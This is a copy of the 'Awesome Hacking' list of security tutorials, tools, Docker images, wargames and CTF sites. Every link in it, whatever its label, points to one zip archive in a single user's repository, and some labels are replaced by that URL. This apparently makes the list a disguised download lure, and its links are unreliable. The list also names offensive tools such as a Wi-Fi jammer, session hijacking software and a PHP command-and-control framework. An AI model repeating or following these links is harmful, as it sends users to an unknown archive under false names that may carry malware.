# Awesome Hacking -An Amazing Project [![Awesome](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)

A curated list of awesome Hacking. Inspired by [awesome-machine-learning](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)

If you want to contribute to this list (please do), send me a pull request!

For a list of free hacking books available for download, go [here](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)


## Table of Contents

<!-- MarkdownTOC depth=4 -->

- [System](#system)
    - [Tutorials](#tutorials)
    - [Tools](#tools)
    - [Docker](#docker-images-for-penetration-testing--security)
    - [General](#general)
- [Reverse Engineering](#reverse-engineering)
    - [Tutorials](#tutorials-1)
    - [Tools](#tools-1)
    - [General](#general-1)
- [Web](#web)
    - [Tools](#tools-2)
    - [General](#general-2)
- [Network](#network)
    - [Tools](#tools-3)
- [Forensic](#forensic)
    - [Tools](#tools-4)
- [Cryptography](#cryptography)
    - [Tools](#tools-5)
- [Wargame](#wargame)
    - [System](#system-1)
    - [Reverse Engineering](#reverse-engineering-1)
    - [Web](#web-1)
    - [Cryptography](#cryptography-1)
    - [Bug bounty](#bug-bounty)
- [CTF](#ctf)
    - [Competition](#competition)
    - [General](#general-2)
- [OS](#os)
    - [Online resources](#online-resources)
- [Post exploitation](#post-exploitation)
    - [tools](#tools-6)
- [ETC](#etc)

<!-- /MarkdownTOC -->

# System

## Tutorials
 * [Roppers Computing Fundamentals](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
    * Free, self-paced curriculum that builds a base of knowledge in computers and networking. Intended to build up a student with no prior technical knowledge to be confident in their ability to learn anything and continue their security education. Full text available as a [gitbook](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip).
 * [Corelan Team's Exploit writing tutorial](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Exploit Writing Tutorials for Pentesters](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Understanding the basics of Linux Binary Exploitation](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Shells](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Missing Semester](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)


## Tools
 * [Metasploit](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) A computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development.
 * [mimikatz](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A little tool to play with Windows security
 * [Hackers tools](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Tutorial on tools.

### Docker Images for Penetration Testing & Security
 * `docker pull kalilinux/kali-linux-docker` [official Kali Linux](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull owasp/zap2docker-stable` - [official OWASP ZAP](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull wpscanteam/wpscan` - [official WPScan](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull metasploitframework/metasploit-framework
` - [Official Metasploit](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull citizenstig/dvwa` - [Damn Vulnerable Web Application (DVWA)](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull wpscanteam/vulnerablewordpress` - [Vulnerable WordPress Installation](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull hmlio/vaas-cve-2014-6271` - [Vulnerability as a service: Shellshock](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull hmlio/vaas-cve-2014-0160` - [Vulnerability as a service: Heartbleed](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull opendns/security-ninjas` - [Security Ninjas](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull noncetonic/archlinux-pentest-lxde` - [Arch Linux Penetration Tester](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull diogomonica/docker-bench-security` - [Docker Bench for Security](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull ismisepaul/securityshepherd` - [OWASP Security Shepherd](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull danmx/docker-owasp-webgoat` - [OWASP WebGoat Project docker image](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull vulnerables/web-owasp-nodegoat` - [OWASP NodeGoat](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull citizenstig/nowasp` - [OWASP Mutillidae II Web Pen-Test Practice Application](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull bkimminich/juice-shop` - [OWASP Juice Shop](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * `docker pull phocean/msf` - [Docker Metasploit](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)

## General
 * [Exploit database](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - An ultimate archive of exploits and vulnerable software


# Reverse Engineering

## Tutorials
* [Begin RE: A Reverse Engineering Tutorial Workshop](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
* [Malware Analysis Tutorials: a Reverse Engineering Approach](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
* [Malware Unicorn Reverse Engineering Tutorial](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
* [Lena151: Reversing With Lena](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)

## Tools
### Disassemblers and debuggers
 * [IDA](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - IDA is a Windows, Linux or Mac OS X hosted multi-processor disassembler and debugger
 * [OllyDbg](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A 32-bit assembler level analysing debugger for Windows
 * [x64dbg](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - An open-source x64/x32 debugger for Windows
 * [radare2](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A portable reversing framework
 * [plasma](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Interactive disassembler for x86/ARM/MIPS. Generates indented pseudo-code with colored syntax code.
 * [ScratchABit](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Easily retargetable and hackable interactive disassembler with IDAPython-compatible plugin API
 * [Capstone](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Ghidra](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A software reverse engineering (SRE) suite of tools developed by NSA's Research Directorate in support of the Cybersecurity mission

### Decompilers
*  JVM-based languages
  * [Krakatau](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - the best decompiler I have used. Is able to decompile apps written in Scala and Kotlin into Java code. JD-GUI and Luyten have failed to do it fully.
  * [JD-GUI](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
  * [procyon](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip%20Decompiler)
    * [Luyten](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - one of the best, though a bit slow, hangs on some binaries and not very well maintained.
  * [JAD](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - JAD Java Decompiler (closed-source, unmaintained)
  * [JADX](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - a decompiler for Android apps. Not related to JAD.

* .net-based languages
  * [dotPeek](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - a free-of-charge .NET decompiler from JetBrains
  * [ILSpy](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - an open-source .NET assembly browser and decompiler
  * [dnSpy](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - .NET assembly editor, decompiler, and debugger

* native code
  * [Hopper](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A OS X and Linux Disassembler/Decompiler for 32/64-bit Windows/Mac/Linux/iOS executables.
  * [cutter](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - a decompiler based on radare2.
  * [retdec](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
  * [snowman](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
  * [Hex-Rays](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)

* Python
  * [uncompyle6](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - decompiler for the over 20 releases and 20 years of CPython.


### Deobfuscators
 * [de4dot](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - .NET deobfuscator and unpacker.
 * [JS Beautifier](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [JS Nice](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - a web service guessing JS variables names and types based on the model derived from open source.

### Other
 * [nudge4j](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Java tool to let the browser talk to the JVM
 * [dex2jar](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Tools to work with Android .dex and Java .class files
 * [androguard](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Reverse engineering, malware and goodware analysis of Android applications
 * [antinet](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - .NET anti-managed debugger and anti-profiler code
 * [UPX](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - the Ultimate Packer (and unpacker) for eXecutables

### Execution logging and tracing
 * [Wireshark](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A free and open-source packet analyzer
 * [tcpdump](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A powerful command-line packet analyzer; and libpcap, a portable C/C++ library for network traffic capture
 * [mitmproxy](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - An interactive, SSL-capable man-in-the-middle proxy for HTTP with a console interface
 * [Charles Proxy](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A cross-platform GUI web debugging proxy to view intercepted HTTP and HTTPS/SSL live traffic
 * [usbmon](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - USB capture for Linux.
 * [USBPcap](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - USB capture for Windows.
 * [dynStruct](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - structures recovery via dynamic instrumentation.
 * [drltrace](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - shared library calls tracing.

### Binary files examination and editing

#### Hex editors
 * [HxD](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A hex editor which, additionally to raw disk editing and modifying of main memory (RAM), handles files of any size
 * [WinHex](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A hexadecimal editor, helpful in the realm of computer forensics, data recovery, low-level data processing, and IT security
* [wxHexEditor](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
* [Synalize It](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)/[Hexinator](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) -

#### Other
 * [Binwalk](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) -  Detects signatures, unpacks archives, visualizes entropy.
 * [Veles](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - a visualizer for statistical properties of blobs.
 * [Kaitai Struct](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - a DSL for creating parsers in a variety of programming languages. The Web IDE is particularly useful for reverse-engineering.
 * [Protobuf inspector](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [DarunGrim](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - executable differ.
 * [DBeaver](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - a DB editor.
 * [Dependencies](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - a FOSS replacement to Dependency Walker.
 * [PEview](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A quick and easy way to view the structure and content of 32-bit Portable Executable (PE) and Component Object File Format (COFF) files
* [BinText](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A small, very fast and powerful text extractor that will be of particular interest to programmers.

## General
 * [Open Malware](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)

# Web

## Tools
 * [Spyse](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) -  Data gathering service that collects web info using OSINT. Provided info: IPv4 hosts, domains/whois, ports/banners/protocols, technologies, OS, AS, maintains huge SSL/TLS DB, and more... All the data is stored in its own database allowing get the data without scanning.
 * [sqlmap](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Automatic SQL injection and database takeover tool
 * [NoSQLMap](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Automated NoSQL database enumeration and web application exploitation tool.
 * [https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - base64 base85 md4,5 hash, sha1 hash encoding/decoding
 * [VHostScan](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A virtual host scanner that performs reverse lookups, can be used with pivot tools, detect catch-all scenarios, aliases and dynamic default pages.
 * [SubFinder](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - SubFinder is a subdomain discovery tool that discovers valid subdomains for any target using passive online sources.
 * [Findsubdomains](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A subdomains discovery tool that collects all possible subdomains from open source internet and validates them through various tools to provide accurate results.
 * [badtouch](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Scriptable network authentication cracker
 * [PhpSploit](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Full-featured C2 framework which silently persists on webserver via evil PHP oneliner
 * [Git-Scanner](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A tool for bug hunting or pentesting for targeting websites that have open `.git` repositories available in public
 * [CSP Scanner](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Analyze a site's Content-Security-Policy (CSP) to find bypasses and missing directives.
 * [Shodan](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A web-crawling search engine that lets users search for various types of servers connected to the internet.
 * [masscan](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Internet scale portscanner.
 * [Keyscope](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - an extensible key and secret validation tool for auditing active secrets against multiple SaaS vendors
 * [https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Java, Android, Python, C# online decompiler.

## General
 * [Strong https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - An exhaustive checklist to assist in the source code security analysis of a https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip web service.


# Network

## Tools
 * [NetworkMiner](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A Network Forensic Analysis Tool (NFAT)
 * [Paros](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A Java-based HTTP/HTTPS proxy for assessing web application vulnerability
 * [pig](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A Linux packet crafting tool
 * [findsubdomains](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - really fast subdomains scanning service that has much greater opportunities than simple subs finder(works using OSINT).
 * [cirt-fuzzer](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A simple TCP/UDP protocol fuzzer.
 * [ASlookup](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - a useful tool for exploring autonomous systems and all related info (CIDR, ASN, Org...)
 * [ZAP](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - The Zed Attack Proxy (ZAP) is an easy to use integrated penetration testing tool for finding vulnerabilities in web applications
 * [mitmsocks4j](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Man-in-the-middle SOCKS Proxy for Java
 * [ssh-mitm](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - An SSH/SFTP man-in-the-middle tool that logs interactive sessions and passwords.
 * [nmap](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Nmap (Network Mapper) is a security scanner
 * [Aircrack-ng](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - An 802.11 WEP and WPA-PSK keys cracking program
 * [Nipe](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A script to make Tor Network your default gateway.
 * [Habu](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Python Network Hacking Toolkit
 * [Wifi Jammer](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Free program to jam all wifi clients in range
 * [Firesheep](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Free program for HTTP session hijacking attacks.
 * [Scapy](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A Python tool and library for low level packet creation and manipulation
 * [Amass](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - In-depth subdomain enumeration tool that performs scraping, recursive brute forcing, crawling of web archives, name altering and reverse DNS sweeping
 * [sniffglue](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Secure multithreaded packet sniffer
 * [Netz](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Discover internet-wide misconfigurations, using zgrab2 and others.
 * [RustScan](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Extremely fast port scanner built with Rust, designed to scan all ports in a couple of seconds and utilizes nmap to perform port enumeration in a fraction of the time.
 * [PETEP](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Extensible TCP/UDP proxy with GUI for traffic analysis & modification with SSL/TLS support.

# Forensic

## Tools
 * [Autopsy](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A digital forensics platform and graphical interface to [The Sleuth Kit](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) and other digital forensics tools
 * [sleuthkit](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A library and collection of command-line digital forensics tools
 * [EnCase](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - The shared technology within a suite of digital investigations products by Guidance Software
 * [malzilla](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Malware hunting tool
 * [IPED - Indexador e Processador de Evidências Digitais](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Brazilian Federal Police Tool for Forensic Investigation
 * [CyLR](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - NTFS forensic image collector 
 * [CAINE](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)- CAINE is a Ubuntu-based app that offers a complete forensic environment that provides a graphical interface. This tool can be integrated into existing software tools as a module. It automatically extracts a timeline from RAM.

# Cryptography

### Tools
 * [xortool](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A tool to analyze multi-byte XOR cipher
 * [John the Ripper](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A fast password cracker
 * [Aircrack](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Aircrack is 802.11 WEP and WPA-PSK keys cracking program.
 * [Ciphey](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Automated decryption tool using artificial intelligence & natural language processing.


# Wargame

## System
 * [OverTheWire - Semtex](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [OverTheWire - Vortex](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [OverTheWire - Drifter](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Provide various pwn challenges regarding system security
 * [Exploit Exercises - Nebula](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [SmashTheStack](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [HackingLab](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) 

## Reverse Engineering
 * [https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - This site tests your ability to Cracking & Reverse Code Engineering
 * [CodeEngn](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - (Korean)
 * [https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - (Korean)
 * [https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - The world first and largest community website for crackmes and reversemes.

## Web
 * [Hack This Site!](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - a free, safe and legal training ground for hackers to test and expand their hacking skills
 * [Hack The Box](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - a free site to perform pentesting in a variety of different systems.
 * [https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - a website without logins or ads where you can solve password-riddles (so called hackits).
 * [https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Website by an Austrian group. Lots of challenges taken from CTFs they participated in.
 * [Gruyere](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Others](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [TryHackMe](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Hands-on cyber security training through real-world scenarios.

## Cryptography
 * [OverTheWire - Krypton](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)

## Bug bounty
  * [Awesome bug bounty resources by EdOverflow](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)

## Bug bounty -  Earn Some Money
  * [Bugcrowd](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
  * [Hackerone](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
  * [Intigriti](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) Europe's #1 ethical hacking and bug bounty program.


# CTF

## Competition
 * [DEF CON](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [CSAW CTF](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
